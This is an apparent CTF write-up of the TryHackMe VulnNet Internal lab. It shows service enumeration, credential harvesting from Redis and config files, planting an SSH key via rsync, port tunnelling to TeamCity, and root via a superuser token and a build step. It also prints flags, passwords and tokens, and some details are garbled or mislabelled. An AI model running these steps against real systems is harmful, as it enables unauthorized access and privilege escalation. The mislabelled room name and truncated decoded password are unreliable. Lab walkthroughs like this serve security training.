This is a writeup for THM box - Anonymous https://tryhackme.com/room/anonymous
                                                        Writeup
                                                    VulnetInternal
first step to is to start machine and get connected to vpn  ```sudo openvpn <file.ovpn>```.
As obvioust after getting ip we first run “nmap -sS -A <ip>” to see the open ports and its complete information .
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      46765/udp6  mountd
|   100005  1,2,3      47919/tcp6  mountd
|   100005  1,2,3      51039/tcp   mountd
|   100005  1,2,3      54085/udp   mountd
|   100021  1,3,4      36367/tcp6  nlockmgr
|   100021  1,3,4      40745/tcp   nlockmgr
|   100021  1,3,4      47261/udp6  nlockmgr
|   100021  1,3,4      57405/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
6379/tcp open    redis            Redis key-value store
2049/tcp open     nfs_acl     3 (RPC #100227)
9090/tcp filtered zeus-admin
here we found some suspicious thisng going on in which “Samba” is most sus and vulnerable so lets try connecting to smbclient
“smbclient -L <ip>”
Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shares          Disk      VulnNet Business Shares
	IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
we have 3 sharename lets look what in it
“smblient //<ip>/sharenames”
we do no get any thing in print$ and IPC$ ut we get get connected to “/shares”
smb: \> ls
  .                                   D        0  Tue Feb  2 14:50:09 2021
  ..                                  D        0  Tue Feb  2 14:58:11 2021
  temp                                D        0  Sat Feb  6 17:15:10 2021
  data                                D        0  Tue Feb  2 14:57:33 2021
c
		11309648 blocks of size 1024. 3279256 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 17:15:10 2021
  ..                                  D        0  Tue Feb  2 14:50:09 2021
  services.txt                        N       38  Sat Feb  6 17:15:09 2021
here we get services.txt so by using “get services.txt” we get file on our local machine and thus by opening it we get flag “THM{0a09d51e488f5fa105d8d866a497440a}”
similarly we get into “data” directory where we got “data.txt & buisness-req.txt” and after getting and opening it we get “Purge regularly data that is not needed anymore & We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.”
 so there we got nothing .
lets check other services going on
since we have mountd service going on lets mount it .Before that we should see which directory are mountable for this use command “showmount -e <ip>”
we get 	Export list for 10.10.35.230:
	 	/opt/conf *
  thes we mounted it using command “sudo mount -t nfs <ip>:/opt/conf .”
then after doing tree command we get to see some new things 
.
├── hp
│   └── hplip.conf
├── init
│   ├── anacron.conf
│   ├── lightdm.conf
│   └── whoopsie.conf
├── opt
├── profile.d
│   ├── bash_completion.sh
│   ├── cedilla-portuguese.sh
│   ├── input-method-config.sh
│   └── vte-2.91.sh
├── redis
│   └── redis.conf
├── vim
│   ├── vimrc
│   └── vimrc.tiny
└── wildmidi
    └── wildmidi.cfg

7 directories, 12 files
from looking ths we get some suspicious thing redis as it was also reflected in nmap scan so lets check out redis
so going into the redis directory and opening the redis.conf file we get some thing interesting “requirepass "B65Hx562F@ggAZ@F"” and this is the password to get connected to redis client.Now lets get connected to redis client 
“redis-cli -h <ip> -p 6379 -a B65Hx562F@ggAZ@F” thus we get connected to redis client 
by runnig info command lets whats’there
<ip>  > info
# Server
....some information......
# Keyspace
db0:keys=5,expires=0,avg_ttl=0
by seeing the keyspace lets check the keys
10.10.35.230:6379> KEYS *
1) "internal flag"
2) "tmp"
3) "authlist"
4) "int"
5) "marketlist"
and thus by seeing the internal flag first thing to do is to check it
<ip>  > get "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
next thing is to check other keys  nothing was found in other except “authlist”by dumping the authlist  base64 string which was very messy but after rearranging it we get 
“QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==”
after decoding it we get “Authorization for rsync://rsync-connect@127.0.0.1 with password z”
so our next way is to resync the files from server 
“rsync -avzh rsync://rsync-connect@<ip>/files /root/files/ 
Password: 
receiving incremental file list
rsync: ERROR: cannot stat destination "/root/files/": Permission denied (13)
rsync error: errors selecting input/output files, dirs (code 3) at main.c(660) [Receiver=3.1.3]”
 after rsync and checking the “/root/files”  we get one more dir “sys-internal”
checking it there is “user.txt”  there is the flag of user 
THM{da7c20696831f253e0afaca8b83c07ab}
next way is to become root 
in the sys-internal directory we also found .ssh files that keep public key so  that’s the way of becoming sys-internal 
first make ssh key on your server and send it to rsync server and try to connect locally using the corresponding private key
creating ssh-key




##########:~/.ssh$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/master/.ssh/id_rsa): authkey
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in authkey
Your public key has been saved in authkey.pub
The key fingerprint is:
SHA256:zc9KsvjIPL4NfMcbP7SNYgiuqsU2U5xR4XY/31wgS+Y 
The key's randomart image is:
+---[RSA 3072]----+
|      o.         |
|     o           |
|    . o .   + .  |
|   . + . + + o . |
|    +   S = E   .|
| . . ..  . =.o . |
|  *  .o.o.=.++o  |
| o o oo*.=o=+ .  |
|.....oB++.o...   |
+----[SHA256]-----+

and we must know tha on server all public keys are in authorized_keys so we must rename the our public keys as authorized_keys now lets send it
for sending file use command 
“rsync -ahv --no-o --no-g  ~/.ssh/authorized_keys rsync://rsync-connect@<ip>/files/sysinternal/.ssh
 now time to connect thorugh our local system
“ssh i authkey sys-internal@<ip>” don’t forget to change the permission of private key to 600.
And there we become sys-internal!!!!!
A quick look around finds an unusual folder at the root of the drive called TeamCity:
“drwxr-xr-x  12 root root      4096 Feb  6  2021 TeamCity”
in that dir we get “TeamCity-readme.txt”
It says on Linux the application is accesible from the localhost on port 8111
“By default, TeamCity will run in your browser on `http://localhost:80/` (Windows) or `http://localhost:8111/` (Linux, macOS).”
Since netstat was not working with this machine we used “ss -tulpn | grep 8111”
so it is listning so next work is tunneling 
for that we run the command on our local system 
“ssh sys-internal@<ip> -i id_rsa -L 8111:127.0.0.1:8111”
it comments us back “Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)”
Now lets go to site as given below “127.0.0.1:8111” as we get into wget the login page but as don’t have any creds we cant login but the is also a option of superuser on the site lets try to find the token for it in sys-internal
so since it token for Teamcity lets first check in the teamcity dir 
just grep the token recursively in all folder “grep -r “token””
there we get tokens in the /logs/catalina.out 
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 6836957943320602292 (use empty username with the token as the password to access the server)
there are many token but one of them works thus we get thw entry in the site as super user
 

 
       



















then after login as it is project website so it is obvious that we could get something after creating project





                                



I’ve clicked on Manually, then filled in the fields and clicked Create. Then I clicked on  Build Configuration and filled that in:










after surfing all the option we get something in the build setup option on the website
as there we see some run command it seems some what interesting 
we also get command line to run so i guess we get the way
 Click save and then run will cause the application to run the command with admin privileges
Now we can switch user to root and get the last flag:
sys-internal@vulnnet-internal:/TeamCity/logs$ sudo su
root@vulnnet-internal:/TeamCity/logs# cat /root/root.txt
THM{e8996faea46df09dba5676dd271c60bd}
